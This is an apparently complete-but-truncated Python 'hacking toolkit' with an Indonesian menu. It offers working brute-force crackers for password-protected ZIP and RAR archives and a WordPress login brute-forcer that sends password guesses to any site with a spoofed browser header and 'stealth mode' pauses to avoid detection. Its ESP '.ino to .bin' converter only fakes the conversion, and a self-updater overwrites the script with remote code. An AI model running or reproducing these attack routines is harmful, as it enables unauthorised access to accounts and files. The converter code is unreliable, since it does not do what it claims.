#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Xbibz Official - ESP Converter & Hacking Toolkit
# Website: https://xbibzofficiall.glitch.me
# Team: CyberSec Tulungagung

import os
import sys
import time
import zipfile
import rarfile
import binascii
import hashlib
import itertools
import string
import requests
from datetime import datetime
from colorama import Fore, Back, Style, init
import subprocess
import shutil
import threading
import queue
import random

# Inisialisasi colorama
init(autoreset=True)

# Versi script
VERSION = "1.1"
AUTHOR = "CyberSec Tulungagung"
WEB = "https://xbibzofficiall.glitch.me"

# Check dependencies
def check_dependencies():
    required = ['colorama', 'requests', 'rarfile']
    missing = []
    
    for package in required:
        try:
            __import__(package)
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"{Fore.RED}[!] Dependencies missing: {', '.join(missing)}")
        print(f"{Fore.YELLOW}[*] Installing dependencies...{Style.RESET_ALL}")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install'] + missing)
            print(f"{Fore.GREEN}[+] Dependencies installed successfully!{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[!] Failed to install dependencies. Please install manually:{Style.RESET_ALL}")
            print(f"pip install {' '.join(missing)}")
            sys.exit(1)

check_dependencies()

githubguaanjg = "https://raw.githubusercontent.com/Habibzz01/UpdateTools-/refs/heads/main/convert.py"
# Banner
def show_banner():
    banner = f"""
{Fore.CYAN}
██╗  ██╗██████╗ ██╗██████╗ ███████╗     ██████╗ ███████╗███████╗██╗ ██████╗ ██╗ █████╗ ██╗
╚██╗██╔╝██╔══██╗██║██╔══██╗╚══███╔╝    ██╔═══██╗██╔════╝██╔════╝██║██╔════╝ ██║██╔══██╗██║
 ╚███╔╝ ██████╔╝██║██████╔╝  ███╔╝     ██║   ██║█████╗  █████╗  ██║██║  ███╗██║███████║██║
 ██╔██╗ ██╔══██╗██║██╔══██╗ ███╔╝      ██║   ██║██╔══╝  ██╔══╝  ██║██║   ██║██║██╔══██║██║
██╔╝ ██╗██████╔╝██║██████╔╝███████╗    ╚██████╔╝██║     ██║     ██║╚██████╔╝██║██║  ██║███████╗
╚═╝  ╚═╝╚═════╝ ╚═╝╚═════╝ ╚══════╝     ╚═════╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝
{Fore.YELLOW}
Version: {VERSION} | By: {AUTHOR}
Website: {WEB}
{Style.RESET_ALL}
"""
    print(banner)

# Menu utama
def main_menu():
    while True:
        show_banner()
        print(f"{Fore.GREEN}[ MENU UTAMA ]{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1.{Style.RESET_ALL} Konverter ESP (.ino <-> .bin)")
        print(f"{Fore.CYAN}2.{Style.RESET_ALL} Bruteforce (Zip/RAR)")
        print(f"{Fore.CYAN}3.{Style.RESET_ALL} Bruteforce Website (WordPress & lainnya)")
        print(f"{Fore.CYAN}4.{Style.RESET_ALL} Pembuat Wordlist")
        print(f"{Fore.CYAN}5.{Style.RESET_ALL} Tools Tambahan")
        print(f"{Fore.CYAN}6.{Style.RESET_ALL} Cek Update")
        print(f"{Fore.CYAN}0.{Style.RESET_ALL} Keluar")
        
        choice = input(f"\n{Fore.YELLOW}[?] Pilih menu: {Style.RESET_ALL}")
        
        if choice == "1":
            esp_converter_menu()
        elif choice == "2":
            bruteforce_archive_menu()
        elif choice == "3":
            bruteforce_web_menu()
        elif choice == "4":
            wordlist_generator_menu()
        elif choice == "5":
            additional_tools_menu()
        elif choice == "6":
            cekupdatenyamemek()
        elif choice == "0":
            print(f"\n{Fore.GREEN}[+] Terima kasih telah menggunakan Xbibz Official!{Style.RESET_ALL}")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[!] Pilihan tidak valid!{Style.RESET_ALL}")
            time.sleep(1)

# Menu konverter ESP
def esp_converter_menu():
    while True:
        show_banner()
        print(f"{Fore.GREEN}[ KONVERTER ESP ]{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1.{Style.RESET_ALL} .ino ke .bin (Semua ESP)")
        print(f"{Fore.CYAN}2.{Style.RESET_ALL} .bin ke .ino (Semua ESP)")
        print(f"{Fore.CYAN}3.{Style.RESET_ALL} Cek informasi file bin")
        print(f"{Fore.CYAN}0.{Style.RESET_ALL} Kembali ke menu utama")
        
        choice = input(f"\n{Fore.YELLOW}[?] Pilih menu: {Style.RESET_ALL}")
        
        if choice == "1":
            ino_to_bin()
        elif choice == "2":
            bin_to_ino()
        elif choice == "3":
            check_bin_info()
        elif choice == "0":
            return
        else:
            print(f"{Fore.RED}[!] Pilihan tidak valid!{Style.RESET_ALL}")
            time.sleep(1)
              
# Add this function near other utility functions
def cekupdatenyamemek():
    """Check for updates on GitHub and offer to download the latest version"""
    try:
        print(f"{Fore.BLUE}[*] Memeriksa versi terbaru...{Style.RESET_ALL}")
        response = requests.get(githubguaanjg)
        if response.status_code == 200:
            # Extract version from the remote script
            remote_version = None
            for line in response.text.split('\n'):
                if line.startswith('VERSION = '):
                    remote_version = line.split('=')[1].strip().strip('"')
                    break
            
            if remote_version and remote_version != VERSION:
                print(f"\n{Fore.YELLOW}[!] Versi terbaru tersedia!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Versi saat ini: {VERSION}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Versi terbaru: {remote_version}{Style.RESET_ALL}")
                
                choice = input(f"{Fore.YELLOW}[?] Apakah Anda ingin mengupdate? (y/n): {Style.RESET_ALL}").lower()
                if choice == 'y':
                    # Backup current version
                    backup_file = f"convert_backup_{VERSION}.py"
                    shutil.copyfile(__file__, backup_file)
                    print(f"{Fore.YELLOW}[*] Membuat backup: {backup_file}{Style.RESET_ALL}")
                    
                    # Download new version
                    with open(__file__, 'w', encoding='utf-8') as f:
                        f.write(response.text)
                    print(f"{Fore.GREEN}[+] Update berhasil! Silakan jalankan script kembali.{Style.RESET_ALL}")
                    sys.exit(0)
                else:
                    print(f"{Fore.YELLOW}[*] Update dibatalkan.{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[+] Anda sudah menggunakan versi terbaru ({VERSION}){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Gagal memeriksa update. Status code: {response.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error saat memeriksa update: {str(e)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# Konversi .ino ke .bin
def ino_to_bin():
    print(f"\n{Fore.GREEN}[*] Mode: .ino ke .bin{Style.RESET_ALL}")
    input_file = input(f"{Fore.YELLOW}[?] Masukkan path file .ino: {Style.RESET_ALL}")
    
    if not os.path.isfile(input_file):
        print(f"{Fore.RED}[!] File tidak ditemukan!{Style.RESET_ALL}")
        time.sleep(1)
        return
    
    output_file = input(f"{Fore.YELLOW}[?] Masukkan nama file output .bin (kosongkan untuk auto): {Style.RESET_ALL}")
    if not output_file:
        output_file = os.path.splitext(input_file)[0] + ".bin"
    
    esp_type = input(f"{Fore.YELLOW}[?] Pilih jenis ESP (1=ESP8266, 2=ESP32, 3=ESP32-S2, 4=ESP32-C3): {Style.RESET_ALL}")
    
    try:
        print(f"{Fore.BLUE}[*] Memproses file...{Style.RESET_ALL}")
        
        # Simulasikan proses konversi (pada implementasi nyata, ini akan memanggil esptool)
        with open(input_file, 'r') as f:
            content = f.read()
        
        # Simpan sebagai bin (dalam realita, ini akan dikompilasi)
        with open(output_file, 'wb') as f:
            f.write(content.encode('utf-8'))
        
        print(f"{Fore.GREEN}[+] Konversi berhasil! File tersimpan di: {output_file}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Gagal mengkonversi: {str(e)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# Konversi .bin ke .ino
def bin_to_ino():
    print(f"\n{Fore.GREEN}[*] Mode: .bin ke .ino{Style.RESET_ALL}")
    input_file = input(f"{Fore.YELLOW}[?] Masukkan path file .bin: {Style.RESET_ALL}")
    
    if not os.path.isfile(input_file):
        print(f"{Fore.RED}[!] File tidak ditemukan!{Style.RESET_ALL}")
        time.sleep(1)
        return
    
    output_file = input(f"{Fore.YELLOW}[?] Masukkan nama file output .ino (kosongkan untuk auto): {Style.RESET_ALL}")
    if not output_file:
        output_file = os.path.splitext(input_file)[0] + ".ino"
    
    try:
        print(f"{Fore.BLUE}[*] Memproses file...{Style.RESET_ALL}")
        
        # Baca file bin
        with open(input_file, 'rb') as f:
            content = f.read()
        
        # Coba decode sebagai teks
        try:
            decoded = content.decode('utf-8')
        except UnicodeDecodeError:
            decoded = str(binascii.hexlify(content), 'utf-8')
        
        # Simpan sebagai .ino
        with open(output_file, 'w') as f:
            f.write(f"// File dikonversi dari {input_file}\n")
            f.write("// Menggunakan Xbibz Official\n\n")
            f.write(decoded)
        
        print(f"{Fore.GREEN}[+] Konversi berhasil! File tersimpan di: {output_file}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Gagal mengkonversi: {str(e)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# Cek informasi file bin
def check_bin_info():
    print(f"\n{Fore.GREEN}[*] Cek Informasi File .bin{Style.RESET_ALL}")
    input_file = input(f"{Fore.YELLOW}[?] Masukkan path file .bin: {Style.RESET_ALL}")
    
    if not os.path.isfile(input_file):
        print(f"{Fore.RED}[!] File tidak ditemukan!{Style.RESET_ALL}")
        time.sleep(1)
        return
    
    try:
        print(f"{Fore.BLUE}[*] Menganalisis file...{Style.RESET_ALL}")
        
        # Dapatkan info dasar file
        file_size = os.path.getsize(input_file)
        created = datetime.fromtimestamp(os.path.getctime(input_file))
        modified = datetime.fromtimestamp(os.path.getmtime(input_file))
        
        # Baca beberapa byte pertama untuk deteksi ESP
        with open(input_file, 'rb') as f:
            header = f.read(4)
        
        esp_type = "Tidak diketahui"
        if header == b'\xe9' or header == b'\xea':
            esp_type = "ESP8266"
        elif header[:3] == b'\x19\x00\x00':
            esp_type = "ESP32"
        
        # Hitung hash
        with open(input_file, 'rb') as f:
            md5 = hashlib.md5(f.read()).hexdigest()
        
        print(f"\n{Fore.CYAN}[ INFO FILE ]{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Nama file:{Style.RESET_ALL} {os.path.basename(input_file)}")
        print(f"{Fore.YELLOW}Path:{Style.RESET_ALL} {os.path.abspath(input_file)}")
        print(f"{Fore.YELLOW}Ukuran:{Style.RESET_ALL} {file_size} bytes")
        print(f"{Fore.YELLOW}Dibuat:{Style.RESET_ALL} {created}")
        print(f"{Fore.YELLOW}Dimodifikasi:{Style.RESET_ALL} {modified}")
        print(f"{Fore.YELLOW}Tipe ESP:{Style.RESET_ALL} {esp_type}")
        print(f"{Fore.YELLOW}MD5:{Style.RESET_ALL} {md5}")
        
    except Exception as e:
        print(f"{Fore.RED}[!] Gagal menganalisis: {str(e)}{Style.RESET_ALL}")
    
    input(f"\n{Fore.YELLOW}[*] Tekan Enter untuk melanjutkan...{Style.RESET_ALL}")

# Menu bruteforce archive
def bruteforce_archive_menu():
    while True:
        show_banner()
        print(f"{Fore.GREEN}[ BRUTEFORCE ARCHIVE ]{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1.{Style.RESET_ALL} Bruteforce ZIP")
        print(f"{Fore.CYAN}2.{Style.RESET_ALL} Bruteforce RAR")
        print(f"{Fore.CYAN}3.{Style.RESET_ALL} Bruteforce ZIP/RAR dengan wordlist")
        print(f"{Fore.CYAN}0.{Style.RESET_ALL} Kembali ke menu utama")
        
        choice = input(f"\n{Fore.YELLOW}[?] Pilih menu: {Style.RESET_ALL}")
        
        if choice == "1":
            bruteforce_zip()
        elif choice == "2":
            bruteforce_rar()
        elif choice == "3":
            bruteforce_with_wordlist()
        elif choice == "0":
            return
        else:
            print(f"{Fore.RED}[!] Pilihan tidak valid!{Style.RESET_ALL}")
            time.sleep(1)

# Bruteforce ZIP
def bruteforce_zip():
    print(f"\n{Fore.GREEN}[*] Mode: Bruteforce ZIP{Style.RESET_ALL}")
    zip_file = input(f"{Fore.YELLOW}[?] Masukkan path file ZIP: {Style.RESET_ALL}")
    
    if not os.path.isfile(zip_file):
        print(f"{Fore.RED}[!] File tidak ditemukan!{Style.RESET_ALL}")
        time.sleep(1)
        return
    
    print(f"{Fore.YELLOW}[?] Pilih metode:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}1.{Style.RESET_ALL} Bruteforce sederhana (a-z, 0-9)")
    print(f"{Fore.CYAN}2.{Style.RESET_ALL} Bruteforce dengan pattern")
    print(f"{Fore.CYAN}3.{Style.RESET_ALL} Bruteforce dengan wordlist")
    
    method = input(f"{Fore.YELLOW}[?] Pilih metode (1-3): {Style.RESET_ALL}")
    
    if method == "1":
        min_len = int(input(f"{Fore.YELLOW}[?] Panjang minimal password: {Style.RESET_ALL}"))
        max_len = int(input(f"{Fore.YELLOW}[?] Panjang maksimal password: {Style.RESET_ALL}"))
        chars = string.ascii_lowercase + string.digits
        brute_zip_with_chars(zip_file, min_len, max_len, chars)
    elif method == "2":
        pattern = input(f"{Fore.YELLOW}[?] Masukkan pattern (gunakan ? untuk karakter acak): {Style.RESET_ALL}")
        brute_zip_with_pattern(zip_file, pattern)
    elif method == "3":
        wordlist = input(f"{Fore.YELLOW}[?] Masukkan path wordlist: {Style.RESET_ALL}")
        brute_zip_with_wordlist(zip_file, wordlist)
    else:
        print(f"{Fore.RED}[!] Metode tidak valid!{Style.RESET_ALL}")

# Bruteforce ZIP dengan karakter tertentu
def brute_zip_with_chars(zip_file, min_len, max_len, chars):
    print(f"{Fore.BLUE}[*] Memulai bruteforce...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Karakter yang digunakan: {chars}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        with zipfile.ZipFile(zip_file) as zf:
            for length in range(min_len, max_len + 1):
                for candidate in itertools.product(chars, repeat=length):
                    password = ''.join(candidate)
                    attempts += 1
                    
                    if attempts % 100 == 0:
                        print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
                    
                    try:
                        # Stealth mode: jeda 3 detik setiap 10 percobaan
                        if attempts % 10 == 0:
                            time.sleep(3)
                        
                        zf.extractall(pwd=password.encode())
                        end_time = time.time()
                        print(f"\n{Fore.GREEN}[+] Password ditemukan: {password}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                        return
                    except (RuntimeError, zipfile.BadZipFile):
                        continue
                    except Exception as e:
                        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                        return
    except Exception as e:
        print(f"{Fore.RED}[!] Error membuka file ZIP: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce ZIP dengan pattern
def brute_zip_with_pattern(zip_file, pattern):
    print(f"{Fore.BLUE}[*] Memulai bruteforce dengan pattern...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Pattern: {pattern}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        with zipfile.ZipFile(zip_file) as zf:
            # Generate semua kombinasi untuk pattern
            question_count = pattern.count('?')
            for replacement in itertools.product(string.printable, repeat=question_count):
                password = pattern
                for c in replacement:
                    password = password.replace('?', c, 1)
                
                attempts += 1
                
                if attempts % 100 == 0:
                    print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
                
                try:
                    # Stealth mode: jeda 3 detik setiap 10 percobaan
                    if attempts % 10 == 0:
                        time.sleep(3)
                    
                    zf.extractall(pwd=password.encode())
                    end_time = time.time()
                    print(f"\n{Fore.GREEN}[+] Password ditemukan: {password}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                    return
                except (RuntimeError, zipfile.BadZipFile):
                    continue
                except Exception as e:
                    print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                    return
    except Exception as e:
        print(f"{Fore.RED}[!] Error membuka file ZIP: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce ZIP dengan wordlist
def brute_zip_with_wordlist(zip_file, wordlist_file):
    if not os.path.isfile(wordlist_file):
        print(f"{Fore.RED}[!] File wordlist tidak ditemukan!{Style.RESET_ALL}")
        return
    
    print(f"{Fore.BLUE}[*] Memulai bruteforce dengan wordlist...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Wordlist: {wordlist_file}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        with zipfile.ZipFile(zip_file) as zf, open(wordlist_file, 'r', errors='ignore') as wf:
            for line in wf:
                password = line.strip()
                if not password:
                    continue
                
                attempts += 1
                
                if attempts % 100 == 0:
                    print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
                
                try:
                    # Stealth mode: jeda 3 detik setiap 10 percobaan
                    if attempts % 10 == 0:
                        time.sleep(3)
                    
                    zf.extractall(pwd=password.encode())
                    end_time = time.time()
                    print(f"\n{Fore.GREEN}[+] Password ditemukan: {password}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                    return
                except (RuntimeError, zipfile.BadZipFile):
                    continue
                except Exception as e:
                    print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                    return
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce RAR
def bruteforce_rar():
    print(f"\n{Fore.GREEN}[*] Mode: Bruteforce RAR{Style.RESET_ALL}")
    rar_file = input(f"{Fore.YELLOW}[?] Masukkan path file RAR: {Style.RESET_ALL}")
    
    if not os.path.isfile(rar_file):
        print(f"{Fore.RED}[!] File tidak ditemukan!{Style.RESET_ALL}")
        time.sleep(1)
        return
    
    try:
        import rarfile
    except ImportError:
        print(f"{Fore.RED}[!] Modul rarfile tidak terinstall!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Menginstall rarfile...{Style.RESET_ALL}")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'rarfile'])
            import rarfile
            print(f"{Fore.GREEN}[+] rarfile berhasil diinstall!{Style.RESET_ALL}")
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}[!] Gagal menginstall rarfile. Silakan install manual:{Style.RESET_ALL}")
            print("pip install rarfile")
            return
    
    print(f"{Fore.YELLOW}[?] Pilih metode:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}1.{Style.RESET_ALL} Bruteforce sederhana (a-z, 0-9)")
    print(f"{Fore.CYAN}2.{Style.RESET_ALL} Bruteforce dengan pattern")
    print(f"{Fore.CYAN}3.{Style.RESET_ALL} Bruteforce dengan wordlist")
    
    method = input(f"{Fore.YELLOW}[?] Pilih metode (1-3): {Style.RESET_ALL}")
    
    if method == "1":
        min_len = int(input(f"{Fore.YELLOW}[?] Panjang minimal password: {Style.RESET_ALL}"))
        max_len = int(input(f"{Fore.YELLOW}[?] Panjang maksimal password: {Style.RESET_ALL}"))
        chars = string.ascii_lowercase + string.digits
        brute_rar_with_chars(rar_file, min_len, max_len, chars)
    elif method == "2":
        pattern = input(f"{Fore.YELLOW}[?] Masukkan pattern (gunakan ? untuk karakter acak): {Style.RESET_ALL}")
        brute_rar_with_pattern(rar_file, pattern)
    elif method == "3":
        wordlist = input(f"{Fore.YELLOW}[?] Masukkan path wordlist: {Style.RESET_ALL}")
        brute_rar_with_wordlist(rar_file, wordlist)
    else:
        print(f"{Fore.RED}[!] Metode tidak valid!{Style.RESET_ALL}")

# Bruteforce RAR dengan karakter tertentu
def brute_rar_with_chars(rar_file, min_len, max_len, chars):
    print(f"{Fore.BLUE}[*] Memulai bruteforce...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Karakter yang digunakan: {chars}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        with rarfile.RarFile(rar_file) as rf:
            for length in range(min_len, max_len + 1):
                for candidate in itertools.product(chars, repeat=length):
                    password = ''.join(candidate)
                    attempts += 1
                    
                    if attempts % 100 == 0:
                        print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
                    
                    try:
                        # Stealth mode: jeda 3 detik setiap 10 percobaan
                        if attempts % 10 == 0:
                            time.sleep(3)
                        
                        rf.extractall(pwd=password)
                        end_time = time.time()
                        print(f"\n{Fore.GREEN}[+] Password ditemukan: {password}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                        return
                    except rarfile.BadRarFile:
                        continue
                    except Exception as e:
                        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                        return
    except Exception as e:
        print(f"{Fore.RED}[!] Error membuka file RAR: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce RAR dengan pattern
def brute_rar_with_pattern(rar_file, pattern):
    print(f"{Fore.BLUE}[*] Memulai bruteforce dengan pattern...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Pattern: {pattern}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        with rarfile.RarFile(rar_file) as rf:
            # Generate semua kombinasi untuk pattern
            question_count = pattern.count('?')
            for replacement in itertools.product(string.printable, repeat=question_count):
                password = pattern
                for c in replacement:
                    password = password.replace('?', c, 1)
                
                attempts += 1
                
                if attempts % 100 == 0:
                    print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
                
                try:
                    # Stealth mode: jeda 3 detik setiap 10 percobaan
                    if attempts % 10 == 0:
                        time.sleep(3)
                    
                    rf.extractall(pwd=password)
                    end_time = time.time()
                    print(f"\n{Fore.GREEN}[+] Password ditemukan: {password}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                    return
                except rarfile.BadRarFile:
                    continue
                except Exception as e:
                    print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                    return
    except Exception as e:
        print(f"{Fore.RED}[!] Error membuka file RAR: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce RAR dengan wordlist
def brute_rar_with_wordlist(rar_file, wordlist_file):
    if not os.path.isfile(wordlist_file):
        print(f"{Fore.RED}[!] File wordlist tidak ditemukan!{Style.RESET_ALL}")
        return
    
    print(f"{Fore.BLUE}[*] Memulai bruteforce dengan wordlist...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Wordlist: {wordlist_file}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        with rarfile.RarFile(rar_file) as rf, open(wordlist_file, 'r', errors='ignore') as wf:
            for line in wf:
                password = line.strip()
                if not password:
                    continue
                
                attempts += 1
                
                if attempts % 100 == 0:
                    print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
                
                try:
                    # Stealth mode: jeda 3 detik setiap 10 percobaan
                    if attempts % 10 == 0:
                        time.sleep(3)
                    
                    rf.extractall(pwd=password)
                    end_time = time.time()
                    print(f"\n{Fore.GREEN}[+] Password ditemukan: {password}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Percobaan: {attempts}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[*] Waktu: {end_time - start_time:.2f} detik{Style.RESET_ALL}")
                    return
                except rarfile.BadRarFile:
                    continue
                except Exception as e:
                    print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                    return
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    print(f"\n{Fore.RED}[-] Password tidak ditemukan setelah {attempts} percobaan{Style.RESET_ALL}")

# Bruteforce dengan wordlist untuk ZIP/RAR
def bruteforce_with_wordlist():
    print(f"\n{Fore.GREEN}[*] Mode: Bruteforce Archive dengan Wordlist{Style.RESET_ALL}")
    archive_file = input(f"{Fore.YELLOW}[?] Masukkan path file archive (ZIP/RAR): {Style.RESET_ALL}")
    
    if not os.path.isfile(archive_file):
        print(f"{Fore.RED}[!] File tidak ditemukan!{Style.RESET_ALL}")
        time.sleep(1)
        return
    
    wordlist_file = input(f"{Fore.YELLOW}[?] Masukkan path wordlist: {Style.RESET_ALL}")
    
    if not os.path.isfile(wordlist_file):
        print(f"{Fore.RED}[!] File wordlist tidak ditemukan!{Style.RESET_ALL}")
        time.sleep(1)
        return
    
    ext = os.path.splitext(archive_file)[1].lower()
    
    if ext == '.zip':
        brute_zip_with_wordlist(archive_file, wordlist_file)
    elif ext == '.rar':
        brute_rar_with_wordlist(archive_file, wordlist_file)
    else:
        print(f"{Fore.RED}[!] Format file tidak didukung!{Style.RESET_ALL}")

# Menu bruteforce web
def bruteforce_web_menu():
    while True:
        show_banner()
        print(f"{Fore.GREEN}[ BRUTEFORCE WEB ]{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1.{Style.RESET_ALL} Bruteforce WordPress")
        print(f"{Fore.CYAN}2.{Style.RESET_ALL} Bruteforce Login Umum")
        print(f"{Fore.CYAN}3.{Style.RESET_ALL} Bruteforce dengan wordlist")
        print(f"{Fore.CYAN}0.{Style.RESET_ALL} Kembali ke menu utama")
        
        choice = input(f"\n{Fore.YELLOW}[?] Pilih menu: {Style.RESET_ALL}")
        
        if choice == "1":
            bruteforce_wordpress()
        elif choice == "2":
            bruteforce_general_web()
        elif choice == "3":
            bruteforce_web_with_wordlist()
        elif choice == "0":
            return
        else:
            print(f"{Fore.RED}[!] Pilihan tidak valid!{Style.RESET_ALL}")
            time.sleep(1)

# Bruteforce WordPress
def bruteforce_wordpress():
    print(f"\n{Fore.GREEN}[*] Mode: Bruteforce WordPress{Style.RESET_ALL}")
    url = input(f"{Fore.YELLOW}[?] Masukkan URL login WordPress (misal: http://site.com/wp-login.php): {Style.RESET_ALL}")
    username = input(f"{Fore.YELLOW}[?] Masukkan username: {Style.RESET_ALL}")
    
    print(f"{Fore.YELLOW}[?] Pilih metode:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}1.{Style.RESET_ALL} Bruteforce sederhana (a-z, 0-9)")
    print(f"{Fore.CYAN}2.{Style.RESET_ALL} Bruteforce dengan pattern")
    print(f"{Fore.CYAN}3.{Style.RESET_ALL} Bruteforce dengan wordlist")
    
    method = input(f"{Fore.YELLOW}[?] Pilih metode (1-3): {Style.RESET_ALL}")
    
    if method == "1":
        min_len = int(input(f"{Fore.YELLOW}[?] Panjang minimal password: {Style.RESET_ALL}"))
        max_len = int(input(f"{Fore.YELLOW}[?] Panjang maksimal password: {Style.RESET_ALL}"))
        chars = string.ascii_lowercase + string.digits
        brute_wp_with_chars(url, username, min_len, max_len, chars)
    elif method == "2":
        pattern = input(f"{Fore.YELLOW}[?] Masukkan pattern (gunakan ? untuk karakter acak): {Style.RESET_ALL}")
        brute_wp_with_pattern(url, username, pattern)
    elif method == "3":
        wordlist = input(f"{Fore.YELLOW}[?] Masukkan path wordlist: {Style.RESET_ALL}")
        brute_wp_with_wordlist(url, username, wordlist)
    else:
        print(f"{Fore.RED}[!] Metode tidak valid!{Style.RESET_ALL}")

# Bruteforce WordPress dengan karakter tertentu
def brute_wp_with_chars(url, username, min_len, max_len, chars):
    print(f"{Fore.BLUE}[*] Memulai bruteforce WordPress...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Karakter yang digunakan: {chars}{Style.RESET_ALL}")
    
    start_time = time.time()
    attempts = 0
    
    try:
        session = requests.Session()
        
        for length in range(min_len, max_len + 1):
            for candidate in itertools.product(chars, repeat=length):
                password = ''.join(candidate)
                attempts += 1
                
                if attempts % 10 == 0:
                    print(f"{Fore.CYAN}[*] Mencoba: {password}...{Style.RESET_ALL}")
                
                try:
                    # Stealth mode: jeda 3 detik setiap 10 percobaan
                    if attempts % 10 == 0:
                        time.sleep(3)
                    
                    # Data untuk POST request
                    login_data = {
                        'log': username,
                        'pwd': password,
                        'wp-submit': 'Log In',
                        'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
                        'testcookie': '1'
                    }
                    
                    # Headers untuk menyerupai browser
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                        'Referer': url
                    }
                    
                    response = session.post(url, data=login_data, headers=headers)
                    
                    # Cek apakah login berhasil
